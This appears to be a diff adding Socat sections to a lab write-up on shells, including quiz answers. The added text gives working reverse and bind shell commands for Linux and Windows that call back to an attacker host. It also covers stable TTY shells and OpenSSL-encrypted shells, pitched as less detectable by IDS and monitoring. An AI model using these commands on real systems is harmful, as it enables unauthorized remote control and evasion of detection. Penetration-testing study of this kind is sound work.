@@ -232,3 +232,195 @@ How would you change your terminal size to have 238 columns?
 What is the syntax for setting up a Python3 webserver on port 80?
 
 **Answer:** sudo python3 -m http.server 80
+
+
+## Task 6 Socat
+Socat is a powerful and versatile tool that shares some similarities with Netcat but offers significantly more flexibility. Think of Socat as a network connector between two endpoints — whether that's between a keyboard and a port, two ports, or even a port and a file. It’s like a portal linking two systems together, allowing data to pass seamlessly.
+
+### Reverse Shells with Socat
+Setting up reverse shells using Socat is slightly more complex than with Netcat, but it offers more stability and options.
+
+**Basic Reverse Shell Listener**
+
+On the attacker machine, use the following command to start a listener:
+```bash
+socat TCP-L:<PORT> -
+```
+
+This command links a TCP listener to standard input/output, similar to:
+```bash
+nc -lvnp <port>
+```
+
+Connecting from Target
+- On Windows:
+  ```bash
+  socat TCP:<ATTACKER-IP>:<PORT> EXEC:powershell.exe,pipes
+  ```
+  The pipes option is crucial here for compatibility between Unix-style I/O and Windows command-line interfaces.
+- On Linux:
+  ```bash
+  socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li"
+  ```
+
+### Bind Shells with Socat
+Bind shells allow the target machine to host the listener. Here’s how you set them up:
+
+**Target (Listener):**
+- On Linux:
+  ```bash
+  socat TCP-L:<PORT> EXEC:"bash -li"
+  ```
+- On Windows:
+  ```bash
+  socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+  ```
+
+**Attacker (Connect to Shell):**
+
+On the attacker’s machine, connect to the listener with:
+```bash
+socat TCP:<TARGET-IP>:<PORT> -
+```
+
+### Stable Linux TTY Reverse Shell (Socat’s Power Feature)
+One of Socat’s most powerful uses is creating a fully stable TTY reverse shell — ideal for Linux targets.
+
+**Listener (Attacker Machine):**
+```bash
+socat TCP-L:<PORT> FILE:`tty`,raw,echo=0
+```
+**Breakdown:**
+- FILE:\tty`` connects standard I/O to the terminal device.
+- raw,echo=0 disables echo and puts terminal in raw mode, improving shell stability.
+
+
+**Target (Trigger Reverse Shell with Socat):**
+```bash
+socat TCP:<ATTACKER-IP>:<PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+
+**Explanation of options:**
+
+- EXEC:"bash -li": Starts a login Bash shell.
+- pty: Allocates a pseudo-terminal.
+- stderr: Displays error output.
+- sigint: Enables signal interruptions like Ctrl+C.
+- setsid: Starts a new session.
+- sane: Normalizes terminal settings for better behavior.
+
+### Enhancements and Troubleshooting
+- For text editor support (e.g., Vim, Nano), consider running:
+  ```bash
+  stty raw -echo; fg
+  ```
+  after receiving the shell.
+
+- For debugging, increase verbosity:
+  ```bash
+  socat -d -d [rest-of-command]
+  ```
+This will help you understand where issues may be occurring, especially when working in unfamiliar environments or experimenting with configurations.
+
+### Question 1:
+How would we get socat to listen on TCP port 8080?
+
+**Answer:** TCP-L:8080
+
+## Task 7 Socat Encrypted Shells
+One of the most powerful features of Socat is its ability to create encrypted bind and reverse shells using OpenSSL. This provides:
+
+- Confidentiality: Encrypted traffic prevents eavesdropping.
+- Stealth: Encrypted traffic is harder for Intrusion Detection Systems (IDS) to analyze.
+- Improved Security: Prevents shell session hijacking.
+
+### Why Use Encrypted Shells?
+Plaintext shells (e.g., Netcat) can be easily sniffed on the network. Encrypted shells ensure that:
+
+- Your commands and responses are secure.
+- The session is less detectable to security monitoring tools.
+
+### Step 1: Generate a Self-Signed SSL Certificate
+Run the following on your attacker machine to generate a certificate and private key:
+```bash
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+```
+- rsa:2048: Generates a 2048-bit RSA key.
+- -nodes: No passphrase.
+- -x509: Self-signed cert.
+- -days 362: Validity of 362 days.
+
+Then merge the key and certificate into a single .pem file:
+```bash
+cat shell.key shell.crt > shell.pem
+```
+
+### Step 2: Encrypted Reverse Shell
+**Attacker (Listener):**
+```bash
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+```
+- OPENSSL-LISTEN: Enables SSL over TCP.
+- cert=shell.pem: Your self-signed cert.
+- verify=0: Skips certificate authority verification.
+
+### Target (Connect Back):
+- On Linux:
+  ```bash
+  socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 EXEC:/bin/bash
+  ```
+- On Windows:
+  ```bash
+  socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 EXEC:powershell.exe,pipes
+  ```
+
+### Step 3: Encrypted Bind Shell
+**Target (Listener):**
+```bash
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+```
+⚠️ You'll need to copy the .pem file to the target, since it's the one hosting the listener.
+
+**Attacker (Connect to Target):**
+```bash
+socat OPENSSL:<TARGET-IP>:<PORT>,verify=0 -
+```
+
+### Encrypted Fully-Interactive TTY Shell (Linux Only)
+You can combine the stable TTY shell with encryption.
+
+**Attacker (Listener):**
+```bash
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
+```
+
+**Target (Encrypted Interactive Shell Connection):**
+```bash
+socat OPENSSL:<ATTACKER-IP>:<PORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+This gives you a fully interactive, encrypted bash shell — stable and secure.
+
+### Final Tips
+- Always remember: the certificate goes with the listener.
+- Use -d -d flags for verbosity if troubleshooting:
+  ```bash
+  socat -d -d [rest-of-command]
+  ```
+- Most targets don’t have Socat by default. If needed, upload a precompiled static binary of Socat.
+
+The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:
+
+![image](https://github.com/user-attachments/assets/5fde3a5f-0a39-42fb-83e5-e66612c3604a)
+
+This technique is invaluable for stealthy and secure remote access during red team operations or penetration tests.
+
+### Question 1:
+What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
+
+**Answer:** socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
+
+### Question 2:
+If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
+
+**Answer:** socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
